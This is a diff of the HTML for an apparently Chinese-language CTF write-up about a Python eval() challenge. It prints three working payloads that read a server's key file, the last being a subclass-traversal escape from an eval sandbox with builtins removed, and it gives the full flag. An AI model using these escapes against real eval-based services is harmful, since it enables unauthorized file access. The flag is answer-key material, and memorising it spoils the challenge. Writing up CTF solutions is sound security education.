@@ -66,28 +66,33 @@ print(long_to_bytes(plain).decode(<span class="string">'utf-8'</span>))
 <p><em>Flag will be given by our backend in the standard <code>sun{}</code> format, but make sure you put all the pieces together!</em></p>
 <hr>
 <ol>
-<li><p>Part One</p>
-<p><code>`</code><br>Welcome to the ProcrastinatorProgrammer backend.<br>Please give me an equation! Any equation! I need to be fed some data to do some processing!I’m super secure, and can use all python! I just use <code>eval()</code> on your data and then whamo, python does all the work!Whatever you do, don’t look at my ./key!</p>
-</li>
+<li>Part One</li>
 </ol>
-<p>Give me an equation please!</p>
-<pre><code>
-`eval()`,使用`open(&apos;key&apos;,&apos;r&apos;).readlines()`得到flag的第一部分`sun{eval_is`
+<pre><code>Welcome to the ProcrastinatorProgrammer backend.
+Please give me an equation! Any equation! I need to be fed some data to do some processing!I&apos;m super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don&apos;t look at my ./key!
 
-2. Part Two
+Give me an equation please!
+</code></pre><p><code>eval()</code>,使用<code>open(&#39;key&#39;,&#39;r&#39;).readlines()</code>得到flag的第一部分<code>sun{eval_is</code></p>
+<ol start="2">
+<li>Part Two</li>
+</ol>
+<pre><code>Welcome to the ProcrastinatorProgrammer backend.
+Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I&apos;ve upped my ante! Now I know it&apos;s secure!I&apos;m super secure, and can use most python math! I just use `eval(client_input, \{\}, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don&apos;t look at my ./key!
 
-</code></pre><p>Welcome to the ProcrastinatorProgrammer backend.<br>Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I’ve upped my ante! Now I know it’s secure!I’m super secure, and can use most python math! I just use <code>eval(client_input, \{\}, safe_math_functions)</code> on your data and then whamo, python does all the work!Whatever you do, don’t look at my ./key!</p>
-<p>Halt in the name of the law!</p>
-<p>What was the ./key found in the previous challenge?</p>
-<pre><code>
-`eval(client_input, {}, safe_math_functions)`,使用`__builtins__[&apos;open&apos;](&apos;key&apos;, &apos;r&apos;).read()`得到flag的第二部分`_safe_`
+Halt in the name of the law!
 
-3. Part Three
+What was the ./key found in the previous challenge?
+</code></pre><p><code>eval(client_input, {}, safe_math_functions)</code>,使用<code>__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()</code>得到flag的第二部分<code>_safe_</code></p>
+<ol start="3">
+<li>Part Three</li>
+</ol>
+<pre><code>Welcome to the ProcrastinatorProgrammer backend.
+Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it&apos;s secure now! Well the second result anyhow.I&apos;m super secure, and can use a bit of python math! I just use `eval(client_input, {&apos;__builtins__&apos;:\{\}})` on your data and then whamo, python does all the work!Whatever you do, don&apos;t look at my ./key!
 
-</code></pre><p>Welcome to the ProcrastinatorProgrammer backend.<br>Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!… I think. Google tells me that it’s secure now! Well the second result anyhow.I’m super secure, and can use a bit of python math! I just use <code>eval(client_input, {&#39;__builtins__&#39;:\{\}})</code> on your data and then whamo, python does all the work!Whatever you do, don’t look at my ./key!</p>
-<p>Halt in the name of the law!</p>
-<p>What was the ./key found in the previous challenge?<br><code>`</code></p>
-<p><code>eval(client_input, {&#39;__builtins__&#39;:{}})</code>,使用<code>[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==&quot;catch_warnings&quot;][0]()._module.__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()</code>得到flag的第三部分<code>only_if_you_ast_whitelist_first}</code></p>
+Halt in the name of the law!
+
+What was the ./key found in the previous challenge?
+</code></pre><p><code>eval(client_input, {&#39;__builtins__&#39;:{}})</code>,使用<code>[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==&quot;catch_warnings&quot;][0]()._module.__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()</code>得到flag的第三部分<code>only_if_you_ast_whitelist_first}</code></p>
 <p>参考文章:</p>
 <ul>
 <li><a href="http://lybniz2.sourceforge.net/safeeval.html" target="_blank" rel="noopener">safe eval</a></li>
